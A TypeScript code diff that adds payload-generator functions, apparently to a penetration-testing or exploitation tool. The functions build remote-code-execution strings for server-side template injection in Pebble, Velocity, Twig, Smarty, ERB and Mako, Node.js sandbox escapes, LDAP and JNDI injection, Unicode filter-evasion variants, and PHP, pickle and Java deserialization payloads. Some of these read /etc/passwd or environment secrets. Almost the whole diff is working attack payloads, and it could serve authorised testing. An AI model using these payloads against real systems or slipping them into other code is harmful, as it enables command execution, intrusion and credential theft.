@@ -3456,3 +3456,199 @@ export function buildPathTraversalChains(cmd: string): string[] {
     `${back}etc/passwd%0aContent-Type: text/html%0a%0a<script>alert(1)</script>`,
   ];
 }
+
+/* ════════════════════════════════════════════════════════════════════════════
+   PEBBLE SSTI  (Java — used in Spring Boot / Thymeleaf fallback / custom CMS)
+   ════════════════════════════════════════════════════════════════════════════ */
+export function buildPebblePayloads(cmd: string): string[] {
+  const e = cmd.replace(/"/g, '\\"');
+  return [
+    `{% set os = "freemarker.template.utility.Execute"?new() %}{{ os("${e}") }}`,
+    `{{ "".class.forName("java.lang.Runtime").getMethod("exec","".class).invoke("".class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"${e}") }}`,
+    `{% for c in "".class.forName("java.lang.ProcessBuilder").getDeclaredConstructors() %}{% if c.parameterTypes.size()==1 %}{% set p = c.newInstance([["/bin/bash","-c","${e}"]]) %}{{ p.start().inputStream.readAllBytes()|string }}{% endif %}{% endfor %}`,
+    `{% set rt = "".class.forName("java.lang.Runtime") %}{% set ex = rt.getMethod("exec","".class) %}{% set res = ex.invoke(rt.getMethod("getRuntime").invoke(null),"${e}") %}{{ res }}`,
+    `{%- set cmd = "${e}" -%}{%- set pb = "java.lang.ProcessBuilder" | new([cmd]) -%}{{ pb.start().inputStream | read }}`,
+  ];
+}
+
+/* ════════════════════════════════════════════════════════════════════════════
+   VELOCITY SSTI  (Java — Apache Velocity in Confluence, Liferay, OpenCMS)
+   ════════════════════════════════════════════════════════════════════════════ */
+export function buildVelocityPayloads(cmd: string): string[] {
+  const e = cmd.replace(/"/g, '\\"');
+  return [
+    `#set($rt=$class.forName("java.lang.Runtime"))#set($ex=$rt.getMethod("exec",$class.forName("java.lang.String")))#set($rr=$rt.getMethod("getRuntime"))#set($r=$rr.invoke(null))#set($p=$ex.invoke($r,"${e}"))`,
+    `#set($pb=$class.forName("java.lang.ProcessBuilder").getDeclaredConstructors()[0])#set($cmd=["/bin/bash","-c","${e}"])#set($p=$pb.newInstance([$cmd]))#set($proc=$p.start())`,
+    `#set($r=$class.forName("java.lang.Runtime").getRuntime())#set($p=$r.exec("${e}"))#set($is=$p.getInputStream())#set($br=$class.forName("java.io.BufferedReader").getConstructors()[0].newInstance([$class.forName("java.io.InputStreamReader").getConstructors()[0].newInstance([$is])]))$br.readLine()`,
+    `$class.inspect($class.forName("java.lang.Runtime").getRuntime().exec("${e}"))`,
+    `#foreach($i in [1..1])#set($r=$class.forName("java.lang.Runtime").getRuntime())#set($p=$r.exec("${e}"))#set($is=$p.getInputStream())#set($br=$class.forName("java.io.BufferedReader").getConstructors()[0].newInstance([$class.forName("java.io.InputStreamReader").getConstructors()[0].newInstance([$is])]))#set($d=$br.readLine())$d#end`,
+    `#set($e="${e}")#set($r=$class.forName("java.lang.Runtime").getRuntime())#set($p=$r.exec($e))`,
+    `#set($x=$class.forName("freemarker.template.utility.Execute").newInstance())$x.exec("${e}")`,
+  ];
+}
+
+/* ════════════════════════════════════════════════════════════════════════════
+   TWIG SSTI  (PHP — Symfony, Drupal, Craft CMS, Mautic)
+   ════════════════════════════════════════════════════════════════════════════ */
+export function buildTwigPayloads(cmd: string): string[] {
+  const e = cmd.replace(/'/g, "\\'");
+  return [
+    `{{["${cmd}"]|map("system")|join}}`,
+    `{{["${cmd}"]|map("passthru")|join}}`,
+    `{{["${cmd}"]|map("exec")|join}}`,
+    `{{"${cmd}"|filter("system")}}`,
+    `{{{"'${e}'":1}|keys|map("system")|join}}`,
+    `{%- set cmd = "${cmd}" -%}{{cmd|filter("system")}}`,
+    `{% set a %}{{["${cmd}"]|map("system")|join}}{% endset %}`,
+    `{{["${cmd}",1]|sort("system")}}`,
+    `{{block("foo","${cmd}")}}`,
+    `{{'id'|filter('system')}}`,
+    `{{app.request.server.get("HTTP_ACCEPT_LANGUAGE")}}`,
+  ];
+}
+
+/* ════════════════════════════════════════════════════════════════════════════
+   SMARTY SSTI  (PHP — osCommerce, phpBB, PostNuke, many custom PHP CMSes)
+   ════════════════════════════════════════════════════════════════════════════ */
+export function buildSmartyPayloads(cmd: string): string[] {
+  const e = cmd.replace(/'/g, "\\'");
+  return [
+    `{system('${e}')}`,
+    `{php}system('${e}');{/php}`,
+    `{exec cmd='${e}'}`,
+    `{"${cmd}"|passthru}`,
+    `{$smarty.version}{php}echo system('${e}');{/php}`,
+    `{if system('${e}')}1{/if}`,
+    `{$a='system'}{$a('${e}')}`,
+    `{if phpversion()}{assign var="x" value="system"}{$x('${e}')}{/if}`,
+    `{function name=x}system('${e}'){/function}{x}`,
+    `{literal}{/literal}{system('${e}')}`,
+  ];
+}
+
+/* ════════════════════════════════════════════════════════════════════════════
+   ERB SSTI  (Ruby — Rails views, Sinatra, Puppet templates, Chef)
+   ════════════════════════════════════════════════════════════════════════════ */
+export function buildErbPayloads(cmd: string): string[] {
+  const e = cmd.replace(/`/g, "\\`").replace(/'/g, "\\'");
+  return [
+    `<%= \`${e}\` %>`,
+    `<%= system("${cmd}") %>`,
+    `<%= IO.popen("${cmd}").read %>`,
+    `<%= Open3.capture2("${cmd}")[0] %>`,
+    `<%= %x{${e}} %>`,
+    `<%= Kernel.exec("${cmd}") %>`,
+    `<%= eval("system('${e}')") %>`,
+    `<% require 'open3' %><%= Open3.capture2e("${cmd}")[0] %>`,
+    `<%= Dir["/etc/passwd"].map{|f| File.read(f) rescue ""}.join %>`,
+    `<%= ENV.to_h.map{|k,v|"#{k}=#{v}"}.join("\\n") %>`,
+  ];
+}
+
+/* ════════════════════════════════════════════════════════════════════════════
+   MAKO SSTI  (Python — Pylons, Pyramid, OpenStack Horizon, some Django apps)
+   ════════════════════════════════════════════════════════════════════════════ */
+export function buildMakoPayloads(cmd: string): string[] {
+  const e = cmd.replace(/'/g, "\\'").replace(/"/g, '\\"');
+  return [
+    `\${__import__('os').popen('${e}').read()}`,
+    `\${__import__('subprocess').check_output('${e}',shell=True,stderr=-2).decode()}`,
+    `<%!import subprocess%>\${subprocess.check_output('${e}',shell=True).decode()}`,
+    `<%def name="x()">\${__import__('os').system('${e}')}</%def>\${x()}`,
+    `<%\nimport os\nos.system('${e}')\n%>`,
+    `\${(lambda:__import__("os").popen("${e}").read())()}`,
+    `\${getattr(__import__("os"),"pop"+"en")("${e}").read()}`,
+    `<% from mako.template import Template %>\${Template('\${__import__("os").popen("${e}").read()}').render()}`,
+  ];
+}
+
+/* ════════════════════════════════════════════════════════════════════════════
+   NODE.JS VM ESCAPE  (sandboxed eval / vm2 pre-patch / safeEval / vm module)
+   ════════════════════════════════════════════════════════════════════════════ */
+export function buildNodeVmEscapePayloads(cmd: string): string[] {
+  const e = cmd.replace(/'/g, "\\'").replace(/"/g, '\\"');
+  return [
+    `require('child_process').execSync('${e}').toString()`,
+    `this.constructor.constructor('return process')().mainModule.require('child_process').execSync('${e}').toString()`,
+    `(function(){return this})().process.mainModule.require('child_process').execSync('${e}').toString()`,
+    `new Function('return process')().mainModule.require('child_process').execSync('${e}').toString()`,
+    `({}).__proto__.constructor('return process')().mainModule.require('child_process').execSync('${e}').toString()`,
+    `[].constructor.constructor('return process.mainModule.require("child_process").execSync("${e}").toString()')()`,
+    `globalThis.process.mainModule.require('child_process').spawnSync('/bin/sh',['-c','${e}']).stdout.toString()`,
+    `(() => { const p = Object.getPrototypeOf(Object.getPrototypeOf(function(){})); return p.constructor("return process")().mainModule.require("child_process").execSync("${e}").toString(); })()`,
+    `(async()=>{const m=await import("child_process");return m.execSync("${e}").toString()})()`,
+    `Function.prototype.constructor.call({},'return process.mainModule.require("child_process").execSync("${e}").toString()')()`,
+  ];
+}
+
+/* ════════════════════════════════════════════════════════════════════════════
+   LDAP INJECTION  (authentication bypass, JNDI/LDAP SSRF, attribute extraction)
+   ════════════════════════════════════════════════════════════════════════════ */
+export function buildLdapInjectionPayloads(): string[] {
+  return [
+    `*)(|(uid=*`,            `*)(|(password=*`,       `admin)(&(password=*`,
+    `*)(uid=*))(|(uid=*`,    `*))%00`,                `admin)(|(objectClass=*`,
+    `*)(objectClass=*))(|(objectClass=*`,
+    `*)(|(mail=*`,           `*)(|(sn=*`,             `*)(|(cn=*`,
+    `*)(|(userPassword=*`,   `admin)(uid=*`,
+    `a)(|(cn=a`,             `a)(cn=*)(|(cn=a`,
+    `)(|(objectClass=*`,     `)(objectClass=*)(&(objectClass=void`,
+    `\${jndi:ldap://127.0.0.1:1389/a}`,
+    `\${jndi:ldaps://127.0.0.1:1389/a}`,
+    `\${jndi:rmi://127.0.0.1:1099/a}`,
+    `\${j\${::-n}di:ldap://127.0.0.1:1389/a}`,
+    `\${j\${lower:n}di:ldap://127.0.0.1:1389/a}`,
+    `\${jndi:dns://127.0.0.1:5353/a}`,
+  ];
+}
+
+/* ════════════════════════════════════════════════════════════════════════════
+   UNICODE NORMALIZATION BYPASS  (WAF evasion via homoglyphs, full-width, NFD)
+   ════════════════════════════════════════════════════════════════════════════ */
+export function buildUnicodeBypassPayloads(cmd: string): string[] {
+  const HMAP: Record<string, string> = {
+    a:"\u0430",b:"\u0432",c:"\u0441",d:"\u0501",e:"\u0435",f:"\uA799",
+    g:"\u0261",h:"\u04BB",i:"\u0456",j:"\u0458",k:"\u043A",l:"\u04C0",
+    m:"\u043C",n:"\u0578",o:"\u043E",p:"\u0440",s:"\u0455",t:"\u0442",
+    u:"\u0446",v:"\u03BD",w:"\u0461",x:"\u0445",y:"\u0443",z:"\u0290",
+  };
+  const homoglyph = (s: string) => [...s].map(c => HMAP[c.toLowerCase()] ?? c).join("");
+  const fullWidth  = (s: string) => [...s].map(c => {
+    const cp = c.codePointAt(0)!;
+    return (cp >= 0x21 && cp <= 0x7e) ? String.fromCodePoint(cp + 0xFEE0) : c;
+  }).join("");
+  return [
+    homoglyph(cmd),
+    fullWidth(cmd),
+    cmd.normalize("NFD"),
+    cmd.split("").join("\u200d"),          // zero-width joiner between every char
+    [...cmd].map(c => c + "\u0301").join(""), // combining acute accent after each char
+    `\u202e${[...cmd].reverse().join("")}\u202c`, // RTL override + LTR mark
+    cmd.replace(/[a-zA-Z]/g, c => String.fromCodePoint(c.codePointAt(0)! + 0xFEE0)),
+    cmd.replace(/[aeiouAEIOU]/g, c => "\\u{" + c.codePointAt(0)!.toString(16) + "}"),
+  ];
+}
+
+/* ════════════════════════════════════════════════════════════════════════════
+   PHP OBJECT INJECTION  (unserialize() gadget chain patterns + Java/Python)
+   ════════════════════════════════════════════════════════════════════════════ */
+export function buildPhpDeserPayloads(cmd: string): string[] {
+  const e = cmd.replace(/"/g, '\\"');
+  const cl = cmd.length;
+  return [
+    `O:8:"stdClass":1:{s:3:"cmd";s:${cl}:"${e}";}`,
+    `a:1:{i:0;O:4:"Phar":1:{s:4:"test";s:${cl}:"${e}";}}`,
+    `O:1:"a":1:{s:5:"value";s:${cl}:"${e}";}`,
+    `phar:///tmp/nx.phar`,
+    `phar:///var/www/html/uploads/nx.phar`,
+    `php://filter/convert.base64-encode/resource=/etc/passwd`,
+    `data://text/plain;base64,${Buffer.from(`<?php system('${e}'); ?>`).toString("base64")}`,
+    // Python pickle gadget (compact)
+    `cos\nsystem\n(S'${e}'\ntR.`,
+    // Java RMI/JNDI deserialization hint
+    `\${jndi:rmi://127.0.0.1:1099/exploit}`,
+    `\${jndi:ldap://127.0.0.1:1389/exploit}`,
+    // Generic ysoserial marker
+    `rO0ABXNy`,
+  ];
+}
